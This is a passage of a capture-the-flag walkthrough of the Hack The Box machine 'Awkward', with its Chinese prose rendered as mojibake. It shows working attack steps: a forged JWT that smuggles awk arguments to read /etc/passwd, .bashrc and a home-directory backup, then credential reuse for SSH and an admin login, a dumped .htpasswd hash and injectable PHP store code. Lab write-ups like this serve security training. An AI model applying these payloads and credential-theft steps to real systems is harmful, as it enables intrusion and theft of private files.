<span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span class="token dyadic-operator operator">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æ¯”å¦‚æˆ‘ä»¬è®©<code>user=/' /etc/passwd '</code>ï¼Œé‚£ä¹ˆå¾—åˆ°çš„å‘½ä»¤å¦‚ä¸‹</p>
<pre class="line-numbers language-apl" data-language="apl"><code class="language-apl">awk <span class="token string">'//'</span> <span class="token monadic-operator operator">/</span>etc<span class="token monadic-operator operator">/</span>passwd <span class="token string">'/'</span> <span class="token monadic-operator operator">/</span>var<span class="token monadic-operator operator">/</span>www<span class="token monadic-operator operator">/</span>private<span class="token monadic-operator operator">/</span>leave_requests<span class="token dyadic-operator operator">.</span>csv<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å¯ä»¥åœ¨è‡ªå·±æœ¬åœ°æµ‹è¯•</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303140858571.png"></p>
<p>ç”¨<a href="https://jwt.io/">JWT Debugger</a>ï¼Œå…ˆå°†è·å–åˆ°çš„tokenå¤åˆ¶åˆ°Encodedæ–‡æœ¬æ¡†é‡Œï¼Œç„¶åä¿®æ”¹Decodedæ–‡æœ¬æ¡†ä¸­usernameå€¼ä¸º<code>/' /etc/passwd '</code>ï¼Œç„¶åå·¦ä¾§Encodedæ–‡æœ¬æ¡†å°±ä¼šå®æ—¶å‡ºç°ä¼ªé€ åçš„tokenå€¼</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303150040606.png"></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# curl http://hat-valley.htb/api/all-leave --header "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ldGMvcGFzc3dkICciLCJpYXQiOjE2Nzc4MjAwNzN9.TyuC5rH79AtjGs4biOvMhtG0CHRm1HfLfrWqRhylrLk" | grep -i /bin/bash
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  3059  100  3059    0     0   3216      0 --:--:-- --:--:-- --:--:--  3213
root:x:0:0:root:/root:/bin/bash
bean:x:1001:1001:,,,:/home/bean:/bin/bash
christine:x:1002:1002:,,,:/home/christine:/bin/bash<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å‘ç°2ä¸ªç”¨æˆ·ï¼Œbeanå’Œchristine</p>
<p>å°è¯•ä¿®æ”¹payloadå¦‚ä¸‹ï¼Œæ‰§è¡Œç±»ä¼¼ä¸Šè¿°çš„å‘½ä»¤</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">{
  "username": "/' /home/bean/.ssh/id_rsa '",
  "iat": 1677820073
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>æŠ¥é”™Failed to retrieve leave requests</p>
<p>ä¿®æ”¹payloadå¦‚ä¸‹</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">{
  "username": "/' /home/christine/.ssh/id_rsa '",
  "iat": 1677820073
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä¾ç„¶æŠ¥é”™Failed to retrieve leave requests</p>
<p>ä¿®æ”¹å¦‚ä¸‹</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">{
  "username": "/' /home/bean/.bashrc '",
  "iat": 1677820073
}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<p>æœ‰ä¸œè¥¿äº†</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# curl http://hat-valley.htb/api/all-leave --header "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vLmJhc2hyYyAnIiwiaWF0IjoxNjc3ODIwMDczfQ.NJ1ArXnFPdqvtf4K9Exdo34a4r73JZNUlg6VANAW7sQ"                    
# ~/.bashrc: executed by bash(1) for non-login shells.
# see /usr/share/doc/bash/examples/startup-files (in the package bash-doc)
# for examples

# If not running interactively, don't do anything
case $- in
    *i*) ;;
      *) return;;
esac

# don't put duplicate lines or lines starting with space in the history.
# See bash(1) for more options
HISTCONTROL=ignoreboth

# append to the history file, don't overwrite it
shopt -s histappend

# for setting history length see HISTSIZE and HISTFILESIZE in bash(1)
HISTSIZE=1000
HISTFILESIZE=2000

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# If set, the pattern "**" used in a pathname expansion context will
# match all files and zero or more directories and subdirectories.
#shopt -s globstar

# make less more friendly for non-text input files, see lesspipe(1)
[ -x /usr/bin/lesspipe ] &amp;&amp; eval "$(SHELL=/bin/sh lesspipe)"

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] &amp;&amp; [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, unless we know we "want" color)
case "$TERM" in
    xterm-color|*-256color) color_prompt=yes;;
esac

# uncomment for a colored prompt, if the terminal has the capability; turned
# off by default to not distract the user: the focus in a terminal window
# should be on the output of commands, not on the prompt
#force_color_prompt=yes

if [ -n "$force_color_prompt" ]; then
    if [ -x /usr/bin/tput ] &amp;&amp; tput setaf 1 &gt;&amp;/dev/null; then
        # We have color support; assume it's compliant with Ecma-48
        # (ISO/IEC-6429). (Lack of such support is extremely rare, and such
        # a case would tend to support setf rather than setaf.)
        color_prompt=yes
    else
        color_prompt=
    fi
fi

if [ "$color_prompt" = yes ]; then
    PS1='${debian_chroot:+($debian_chroot)}\[\033[01;32m\]\u@\h\[\033[00m\]:\[\033[01;34m\]\w\[\033[00m\]\$ '
else
    PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
fi
unset color_prompt force_color_prompt

# If this is an xterm set the title to user@host:dir
case "$TERM" in
xterm*|rxvt*)
    PS1="\[\e]0;${debian_chroot:+($debian_chroot)}\u@\h: \w\a\]$PS1"
    ;;
*)
    ;;
esac

# enable color support of ls and also add handy aliases
if [ -x /usr/bin/dircolors ]; then
    test -r ~/.dircolors &amp;&amp; eval "$(dircolors -b ~/.dircolors)" || eval "$(dircolors -b)"
    alias ls='ls --color=auto'
    #alias dir='dir --color=auto'
    #alias vdir='vdir --color=auto'

    alias grep='grep --color=auto'
    alias fgrep='fgrep --color=auto'
    alias egrep='egrep --color=auto'
fi

# colored GCC warnings and errors
#export GCC_COLORS='error=01;31:warning=01;35:note=01;36:caret=01;32:locus=01:quote=01'

# some more ls aliases
alias ll='ls -alF'
alias la='ls -A'
alias l='ls -CF'

# custom
alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'

# Add an "alert" alias for long running commands.  Use like so:
#   sleep 10; alert
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] &amp;&amp; echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&amp;|]\s*alert$//'\'')"'

# Alias definitions.
# You may want to put all your additions into a separate file like
# ~/.bash_aliases, instead of adding them here directly.
# See /usr/share/doc/bash-doc/examples in the bash-doc package.

if [ -f ~/.bash_aliases ]; then
    . ~/.bash_aliases
fi

# enable programmable completion features (you don't need to enable
# this, if it's already enabled in /etc/bash.bashrc and /etc/profile
# sources /etc/bash.bashrc).
if ! shopt -oq posix; then
  if [ -f /usr/share/bash-completion/bash_completion ]; then
    . /usr/share/bash-completion/bash_completion
  elif [ -f /etc/bash_completion ]; then
    . /etc/bash_completion
  fi
fi<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å¤§æ¦‚åœ¨98è¡Œï¼Œçœ‹åˆ°æœ‰</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">alias backup_home='/bin/bash /home/bean/Documents/backup_home.sh'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å°è¯•ç”¨JWTå»è¯»<code>/home/bean/Documents/backup_home.sh</code></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# curl http://hat-valley.htb/api/all-leave --header "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cF9ob21lLnNoICciLCJpYXQiOjE2Nzc4MjAwNzN9.FeikFTrIWzIe5LAJnPRZGH_Z7B1RLpfKJ4saxf9T74s"
#!/bin/bash
mkdir /home/bean/Documents/backup_tmp
cd /home/bean
tar --exclude='.npm' --exclude='.cache' --exclude='.vscode' -czvf /home/bean/Documents/backup_tmp/bean_backup.tar.gz .
date &gt; /home/bean/Documents/backup_tmp/time.txt
cd /home/bean/Documents/backup_tmp
tar -czvf /home/bean/Documents/backup/bean_backup_final.tar.gz .
rm -r /home/bean/Documents/backup_tmp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>çœ‹åˆ°æœ‰<code>/home/bean/Documents/backup/bean_backup_final.tar.gz</code></p>
<p>å†ç”¨JWTå»è¯»ï¼Œå¹¶ä¸”ç”¨curlæŠŠä»–è¾“å‡ºåˆ°æœ¬åœ°</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop]
â””â”€# curl http://hat-valley.htb/api/all-leave --header "Cookie: token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VybmFtZSI6Ii8nIC9ob21lL2JlYW4vRG9jdW1lbnRzL2JhY2t1cC9iZWFuX2JhY2t1cF9maW5hbC50YXIuZ3ogJyIsImlhdCI6MTY3NzgyMDA3M30.wArGs4nDtEexKppqgQ1gHSOrq1y91D486JBYTpN4f7E" --output bean_backup_final.zip
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100 31716  100 31716    0     0  20265      0  0:00:01  0:00:01 --:--:-- 20265<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>unzipä¸è¡Œï¼Œç›´æ¥åŒå‡»æ‰“å¼€ï¼ŒæŠŠæ–‡ä»¶æ‹–å‡ºæ¥ï¼Œä¾æ¬¡å¾—åˆ°å¦‚ä¸‹å›¾æ–‡ä»¶</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303170423291.png"></p>
<p>è§£å‹bean_backup.tar.gzå¾—åˆ°ä»¥ä¸‹æ–‡ä»¶</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€(rootğŸ’€kali)-[~/Desktop/bean_backup]
â””â”€# ls -la
total 72
drwxr-x--- 15 1001 1001 4096 Sep 15 07:45 .
drwxr-x---  3 1001 1001 4096 Mar  3 04:19 ..
lrwxrwxrwx  1 1001 1001    9 Sep 15 07:40 .bash_history -&gt; /dev/null
-rw-r--r--  1 1001 1001  220 Sep 15 07:34 .bash_logout
-rw-r--r--  1 1001 1001 3847 Sep 15 07:45 .bashrc
drwx------ 12 1001 1001 4096 Sep 15 07:41 .config
drwxr-xr-x  2 1001 1001 4096 Sep 15 07:35 Desktop
drwxr-xr-x  4 1001 1001 4096 Sep 15 07:46 Documents
drwxr-xr-x  2 1001 1001 4096 Sep 15 07:35 Downloads
drwx------  2 1001 1001 4096 Sep 15 07:36 .gnupg
drwx------  3 1001 1001 4096 Sep 15 07:35 .local
drwxr-xr-x  2 1001 1001 4096 Sep 15 07:35 Music
drwxr-xr-x  2 1001 1001 4096 Sep 15 07:35 Pictures
-rw-r--r--  1 1001 1001  807 Sep 15 07:34 .profile
drwxr-xr-x  2 1001 1001 4096 Sep 15 07:35 Public
drwx------  3 1001 1001 4096 Sep 15 07:35 snap
drwx------  2 1001 1001 4096 Sep 15 07:36 .ssh
drwxr-xr-x  2 1001 1001 4096 Sep 15 07:35 Templates
drwxr-xr-x  2 1001 1001 4096 Sep 15 07:35 Videos<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>åœ¨<code>.config/xpad/content-DS1ZS1</code>æ–‡ä»¶é‡Œå‘ç°ä¸€å¯¹ç–‘ä¼¼ç”¨æˆ·åå¯†ç çš„ä¸œè¥¿ï¼Œæœ€åè¿˜æœ‰ä¸€å¥ï¼Œ<code>MAKE SURE TO USE THIS EVERYWHERE</code>ï¼Œçœ‹æ¥è¿™ä¸ªè´¦æˆ·å¯†ç ä¼šä¸æ­¢ä¸€æ¬¡ç”¨åˆ°ï¼Œç”±æ­¤å¯è§ï¼Œè‹¥æ˜¯åœ¨çœŸå®æ¸—é€ï¼Œå‰æœŸæ”¶é›†çš„èµ„äº§å¯èƒ½åæœŸè¿˜ä¼šç”¨åˆ°ï¼Œæ•´ç†å¥½èµ„äº§ï¼</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean.hill	#è¿æ¥sshæ—¶å‘ç°ç”¨æˆ·åæ˜¯bean
014mrbeanrules!#P<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303172108467.png"></p>
<p>SSHè¿ä¸Šå»</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303172702700.png"></p>
<h2 id="äº”ã€æƒé™æå‡"><a href="#äº”ã€æƒé™æå‡" class="headerlink" title="äº”ã€æƒé™æå‡"></a>äº”ã€æƒé™æå‡</h2><p>æŸ¥çœ‹hostæ–‡ä»¶</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean@awkward:~$ cat /etc/hosts
127.0.0.1       localhost hat-valley.htb store.hat-valley.htb
127.0.0.1       awkward

# The following lines are desirable for IPv6 capable hosts
::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>å‘ç°æ–°å­åŸŸåï¼Œæ·»åŠ è¿›æœ¬åœ°hostsæ–‡ä»¶ï¼Œè®¿é—®ï¼Œå‘ç°è¦ç”¨æˆ·åå¯†ç </p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">store.hat-valley.htb<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç½‘ç«™æ˜¯nginxæœåŠ¡å™¨ï¼ŒnginxæœåŠ¡å™¨çš„é»˜è®¤ç”¨æˆ·åå¯†ç é€šå¸¸åœ¨<code>/etc/nginx/conf.d/.htaccess</code>ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°è¯•è®¿é—®ï¼Œä½†è®¿é—®ä¸åˆ°ï¼Œå‘ç°æœ‰<code>/etc/nginx/conf.d/.htpasswd</code></p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303173843111.png"></p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean@awkward:~$ cat /etc/nginx/conf.d/.htpasswd
admin:$apr1$lfvrwhqi$hd49MbBX3WNluMezyjWls1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>hashå°è¯•å„ç§çˆ†ç ´æ— æœï¼Œæƒ³èµ·ä¹‹å‰çš„<code>MAKE SURE TO USE THIS EVERYWHERE</code>ï¼Œå°è¯•å„ç§ç»„åˆä¹‹åï¼Œå‘ç°ç”¨æˆ·åæ˜¯adminï¼Œå¯†ç æ˜¯beanç”¨æˆ·çš„å¯†ç ï¼ŒæˆåŠŸç™»å…¥</p>
<p><img src="https://img-1310220602.cos.ap-shanghai.myqcloud.com/image-20230303174518831.png"></p>
<p>ç»æŸ¥æ‰¾ï¼Œç«™ç‚¹æºç åœ¨<code>/var/www/store</code>ç›®å½•ä¸‹</p>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean@awkward:/var/www/store$ ls -la
total 104
drwxr-xr-x 9 root root  4096 Oct  6 01:35 .
drwxr-xr-x 7 root root  4096 Oct  6 01:35 ..
drwxrwxrwx 2 root root  4096 Mar  3 21:30 cart
-rwxr-xr-x 1 root root  3664 Sep 15 20:09 cart_actions.php
-rwxr-xr-x 1 root root 12140 Sep 15 20:09 cart.php
-rwxr-xr-x 1 root root  9143 Sep 15 20:09 checkout.php
drwxr-xr-x 2 root root  4096 Oct  6 01:35 css
drwxr-xr-x 2 root root  4096 Oct  6 01:35 fonts
drwxr-xr-x 6 root root  4096 Oct  6 01:35 img
-rwxr-xr-x 1 root root 14770 Sep 15 20:09 index.php
drwxr-xr-x 3 root root  4096 Oct  6 01:35 js
drwxrwxrwx 2 root root  4096 Mar  3 21:50 product-details
-rwxr-xr-x 1 root root   918 Sep 15 20:09 README.md
-rwxr-xr-x 1 root root 13731 Sep 15 20:09 shop.php
drwxr-xr-x 6 root root  4096 Oct  6 01:35 static
-rwxr-xr-x 1 root root   695 Sep 15 20:09 style.css<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æŸ¥çœ‹<code>README.md</code></p>
<p>æœ‰å‡ ä¸ªä¿¡æ¯</p>
<ol>
<li><p>æ²¡æœ‰æ•°æ®åº“ï¼Œåªæœ‰ç¦»çº¿æ–‡ä»¶</p>
</li>
<li><p><code>/product-details</code>å­˜å‚¨äº§å“ä¿¡æ¯</p>
</li>
<li><p><code>/cart</code>å­˜å‚¨ç”¨æˆ·çš„è´­ç‰©è½¦ä¿¡æ¯ï¼Œå¹¶ä¸”æ ¹æ®ç”¨æˆ·çš„<code>session ID</code>å‘½å</p>
</li>
</ol>
<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">bean@awkward:/var/www/store$ cat README.md                                       
# Hat Valley - Shop Online!                                                         
                                                                                     
### To Do                                                                             
1. Waiting for SQL database to be setup, using offline files for now, will merge with database once it is setup
2. Implement checkout system, link with credit card system (Stripe??)                 
3. Implement shop filter                                                             
4. Get full catalogue of items                                                                           
### How to Add New Catalogue Item                                                     
1. Copy an existing item from /product-details and paste it in the same folder, changing the name to reflect a new product ID
2. Change the fields to the appropriate values and save the file.  
-- NOTE: Please leave the header on first line! This is used to verify it as a valid Hat Valley product. --

### Hat Valley Cart
Right now, the user's cart is stored within /cart, and is named according to the user's session ID. All products are appended to the same file for each user.
To test cart functionality, create a new cart file and add items to it, and see how they are reflected on the store website!<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>æŸ¥çœ‹<code>cart_actions.php</code></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$STORE_HOME</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/var/www/store/"</span><span class="token punctuation">;</span>

<span class="token comment">//check for valid hat valley store item</span>
<span class="token keyword">function</span> <span class="token function-definition function">checkValidItem</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token variable">$first_line</span> <span class="token operator">=</span> <span class="token function">file</span><span class="token punctuation">(</span><span class="token variable">$filename</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$first_line</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"***Hat Valley"</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">return</span> <span class="token constant boolean">true</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">return</span> <span class="token constant boolean">false</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//add to cart</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'POST'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'add_item'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'item'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
    <span class="token variable">$item_id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'item'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$user_id</span> <span class="token operator">=</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
    <span class="token variable">$bad_chars</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string double-quoted-string">";"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&amp;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"|"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&gt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"&lt;"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"*"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"?"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"`"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"$"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"("</span><span class="token punctuation">,</span><span class="token string double-quoted-string">")"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"{"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"}"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"["</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"]"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"!"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"#"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//no hacking allowed!!</span>

    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$bad_chars</span> <span class="token keyword">as</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$item_id</span><span class="token punctuation">,</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Bad character detected!"</span><span class="token punctuation">;</span>
            <span class="token keyword">exit</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">foreach</span><span class="token punctuation">(</span><span class="token variable">$bad_chars</span> <span class="token keyword">as</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$user_id</span><span class="token punctuation">,</span> <span class="token variable">$bad</span><span class="token punctuation">)</span> <span class="token operator">!==</span> <span class="token constant boolean">FALSE</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Bad character detected!"</span><span class="token punctuation">;</span>
            <span class="token keyword">exit</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
    <span class="token punctuation">}</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">checkValidItem</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>product-details/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$item_id</span><span class="token punctuation">}</span></span>.txt"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$user_id</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
            <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"echo '***Hat Valley Cart***' &gt; <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$user_id</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">}</span>
        <span class="token function">system</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"head -2 <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>product-details/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$item_id</span><span class="token punctuation">}</span></span>.txt | tail -1 &gt;&gt; <span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$STORE_HOME</span><span class="token punctuation">}</span></span>cart/<span class="token interpolation"><span class="token punctuation">{</span><span class="token variable">$user_id</span><span class="token punctuation">}</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Item added successfully!"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">else</span> <span class="token punctuation">{</span>
        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Invalid item"</span><span class="token punctuation">;</span>
    <span class="token punctuation">}</span>
    <span class="token keyword">exit</span><span class="token punctuation">;</span>
<span class="token punctuation">}</span>

<span class="token comment">//delete from cart</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'REQUEST_METHOD'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'POST'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'action'</span><span class="token punctuation">]</span> <span class="token operator">===</span> <span class="token string single-quoted-string">'delete_item'</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'item'</span><span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'user'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
